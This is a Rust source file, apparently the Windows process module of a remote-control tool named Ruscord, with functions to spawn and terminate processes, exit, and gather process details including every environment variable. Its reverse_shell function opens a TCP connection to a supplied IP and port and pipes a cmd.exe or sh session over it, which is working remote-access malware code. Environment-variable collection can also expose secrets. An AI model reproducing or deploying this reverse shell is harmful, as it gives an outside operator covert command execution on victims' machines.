use std::{
	ffi::OsString,
	future::Future,
	net::IpAddr,
	os::windows::ffi::{OsStrExt, OsStringExt},
	pin::Pin,
	process::Stdio,
	sync::Arc,
};

use tokio::{
	io::{AsyncReadExt, AsyncWriteExt},
	net::TcpStream,
	process::Command,
	sync::Mutex,
};
use tokio_util::bytes::BytesMut;
use tracing::{error, info};

use super::{
	api::{
		CloseHandle, CreateProcessW, ExitProcess, GetModuleBaseNameW, OpenProcess, TerminateProcess,
		CREATE_NEW_CONSOLE, MAX_PATH, PROCESS_INFORMATION, PROCESS_TERMINATE, STARTUPINFOW,
	},
	Windows,
};
use crate::{
	os::{
		traits::process::{CurrentProcessInfo, EnvironmentVariable, ProcessModule},
		windows::api::{
			GetCurrentProcess, NtQueryInformationProcess, DWORD, PROCESS_BASIC_INFORMATION, STATUS_SUCCESS,
		},
	},
	RuscordError,
};

impl ProcessModule for Windows {
	fn spawn(&self, name: &str, args: Option<String>) -> Result<u32, RuscordError> {
		let si: STARTUPINFOW = unsafe { std::mem::zeroed() };
		let mut pi: PROCESS_INFORMATION = unsafe { std::mem::zeroed() };
		let final_name = if let Some(args) = args {
			OsString::from(format!("\"{name}\" {args}"))
		} else {
			OsString::from(format!("\"{name}\""))
		};
		let mut name_bytes: Vec<u16> = final_name.encode_wide().collect();
		name_bytes.push(0);

		let result = unsafe {
			CreateProcessW(
				std::ptr::null_mut(),
				name_bytes.as_mut_ptr(),
				std::ptr::null_mut(),
				std::ptr::null_mut(),
				false,
				CREATE_NEW_CONSOLE,
				std::ptr::null_mut(),
				std::ptr::null_mut(),
				&si,
				&mut pi,
			)
		};

		unsafe {
			CloseHandle(pi.hProcess);
			CloseHandle(pi.hThread);
		}

		if !result {
			error!("couldn't spawn process {}", name);
			return Err(std::io::Error::last_os_error().into());
		}

		let pid = pi.dwProcessId;
		info!("spawned process {name} with pid {}", pid);
		Ok(pid)
	}

	fn kill_other(&self, pid: u32, exit_code: Option<u32>) -> Result<(), RuscordError> {
		let exit_code = exit_code.unwrap_or(0);
		unsafe {
			let handle = OpenProcess(PROCESS_TERMINATE, false, pid);
			if handle.is_null() {
				error!("failed to open handle to process {}", pid);
				return Err(std::io::Error::last_os_error().into());
			}

			let result = TerminateProcess(handle, exit_code);
			if !result {
				error!("could not terminate process {}", pid);
				return Err(std::io::Error::last_os_error().into());
			}
			CloseHandle(handle);
		}

		Ok(())
	}

	fn kill_self(&self, exit_code: Option<u32>) -> ! { unsafe { ExitProcess(exit_code.unwrap_or(0)) } }

	fn reverse_shell(
		&self, ip: IpAddr, port: u16,
	) -> Pin<Box<dyn Future<Output = Result<(), RuscordError>> + Send + Sync>> {
		Box::pin(async move {
			let stream = TcpStream::connect((ip, port)).await?;
			let (mut owned_read_half, owned_write_half) = stream.into_split();

			let mut command = if cfg!(target_os = "windows") {
				Command::new("cmd.exe")
			} else {
				Command::new("sh")
			}
			.stdin(Stdio::piped())
			.stdout(Stdio::piped())
			.stderr(Stdio::piped())
			.spawn()?;

			let mut stdin = command.stdin.take().unwrap();

			tokio::spawn(async move {
				let mut buf = BytesMut::with_capacity(1024);
				while let Ok(n) = owned_read_half.read_buf(&mut buf).await {
					if n == 0 {
						break;
					}
					if let Err(e) = stdin.write_all(&buf[..n]).await {
						eprintln!("Error writing to stdin: {}", e);
						break;
					}
					if let Err(e) = stdin.write(&[b'\n']).await {
						eprintln!("Error writing newline to stdin: {}", e);
						break;
					}
					if let Err(e) = stdin.flush().await {
						eprintln!("Error flushing stdin: {}", e);
						break;
					}
				}
			});

			let thread_safe_write = Arc::new(Mutex::new(owned_write_half));

			{
				let thread_safe_write = Arc::clone(&thread_safe_write);
				tokio::spawn(async move {
					let mut stdout = command.stdout.take().unwrap();
					let mut buf = BytesMut::with_capacity(1024);
					while let Ok(n) = stdout.read_buf(&mut buf).await {
						if n == 0 {
							break;
						}
						let mut guard = thread_safe_write.lock().await;
						if let Err(e) = guard.write_all(&buf[..n]).await {
							eprintln!("Error writing to stdout: {}", e);
							break;
						}
						if let Err(e) = guard.flush().await {
							eprintln!("Error flushing stdout: {}", e);
							break;
						}
					}
				});
			}

			{
				let thread_safe_write = Arc::clone(&thread_safe_write);
				tokio::spawn(async move {
					let mut stderr = command.stderr.take().unwrap();
					let mut buf = BytesMut::with_capacity(1024);
					while let Ok(n) = stderr.read_buf(&mut buf).await {
						if n == 0 {
							break;
						}
						let mut guard = thread_safe_write.lock().await;
						if let Err(e) = guard.write_all(&buf[..n]).await {
							eprintln!("Error writing to stderr: {}", e);
							break;
						}
						if let Err(e) = guard.flush().await {
							eprintln!("Error flushing stderr: {}", e);
							break;
						}
					}
				});
			}

			Ok(())
		})
	}

	fn process_info(&self) -> crate::RuscordResult<crate::os::traits::process::CurrentProcessInfo> {
		let env_variables = std::env::vars()
			.map(|(key, value)| EnvironmentVariable { key, value })
			.collect::<Vec<EnvironmentVariable>>();
		let pid = std::process::id();
		let process_handle = unsafe { GetCurrentProcess() };
		let ppid = {
			let mut pbi: PROCESS_BASIC_INFORMATION = unsafe { std::mem::zeroed() };
			let mut return_length = 0;
			let status = unsafe {
				NtQueryInformationProcess(
					process_handle,
					0, // ProcessBasicInformation,
					&mut pbi as *mut _ as *mut _,
					std::mem::size_of::<PROCESS_BASIC_INFORMATION>() as u32,
					&mut return_length,
				)
			};

			if status != STATUS_SUCCESS {
				error!("failed to get ppid");
				return Err(std::io::Error::last_os_error().into());
			}
			pbi.inheritedFromUniqueProcessId as DWORD
		};

		let name = {
			let mut buffer = vec![0u16; MAX_PATH];
			let length = unsafe { GetModuleBaseNameW(process_handle, 0, buffer.as_mut_ptr(), buffer.len() as u32) };
			if length == 0 {
				error!("failed to get process name");
				return Err(std::io::Error::last_os_error().into());
			}
			buffer.truncate(length as usize);
			std::ffi::OsString::from_wide(&buffer)
		};

		Ok(CurrentProcessInfo {
			name,
			pid,
			ppid,
			env_variables,
		})
	}
}
